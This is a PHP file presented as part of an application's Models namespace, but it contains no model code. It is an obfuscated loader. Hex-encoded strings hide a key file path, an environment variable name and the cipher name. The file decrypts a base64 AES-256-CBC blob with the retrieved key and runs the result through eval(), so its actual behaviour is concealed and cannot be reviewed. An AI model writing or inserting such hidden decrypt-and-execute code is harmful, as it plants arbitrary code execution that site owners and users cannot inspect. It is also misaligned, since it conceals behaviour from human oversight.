<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('K7/jAOLqUg+e01qrIOUf9w==');

$c=base64_decode(

'p39FtbAezc6LxEtCeIuoY7gJCb6jaOAhzFyoKNalxQV3I4AszVfwwFwkwQwOkyDdEO2pMP66CDiW' .
'MST9op6T7pkRHzakb0Z63KuvoeinMIHbXZ0gJSo4uCcTEcOmX8aU6uIBF/qfP2fQDMj6WVDC6GIQ' .
'l46iYZEHnMGIL6Uqcv4wiTmvtxH1W4n6Z7M8y+5XDmbqS/HmorVX7OtXfiodegJCqSbGLP4j3/AM' .
'nfn7Z2XyUjsx3vUwFc5nc5bPrOSnjWH/b5tr4hzOHCV5FZD82OKrlDLzNSlQbedtZQtdC2F3x/xW' .
'Bl7BBz6h16YETfeZBaMQ0bdr+gjSYMbLHIFjOZdG/tT8uUXNSXD+ntLzreWR4Clbf0inVrfnUfjL' .
'LfQWB2EFcIq+GZg1FUpJy7voeX1oUh7zOQuBRzD3joCeqlHHqWHQccOsaRKEIzeMD8rwtVAG2F5n' .
'nZXZgGVg1bAl6gqlYjTdN6qibFG2MHS7rPkqr65cHntoBA7z8kuJMpBmd63gBKpNb7g6/n52MJfH' .
'mQ7/1r9Rsqr0RP7FFoM86yOQlWqLfGBiqHcuDp+lpi9LyiKqzSI7VEcQ85oXJuVavj31dE6KKXlV' .
'R+/pn1DZR1iWxQtfRxkIW9Ed+Ex6W30PHsDg5Ma/CmsFUy7mh1TyiB74p3RIzeEcmBDEYIIPKa2P' .
'B5B6mV/QFzUhFUswC71J9qFP+64LIvKqEuVvNQu4Y1q8TTlNBY9df4WnKiw3DPwl5sMY/CUNDZCR' .
'cCRB3eC+YObFCbyaucujEex2K81UoN6suT/AGBV9aSz6h7I8f3oyFCewqEptR9tzoyBBcStIw2OY' .
'N1fYnVR/9NXBRMiBzUudA4fmmS7F9G56jKiqRcNnhKZzkkU75fh6mviCvuHJq654C3o+iSApIS4V' .
'2R4hzSyUI/c/MLk/MaoSyEPdQH1ujila3G/8pCl0wPbi8svL4lD7Y8hjccVkn5hnxOwo2Q=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

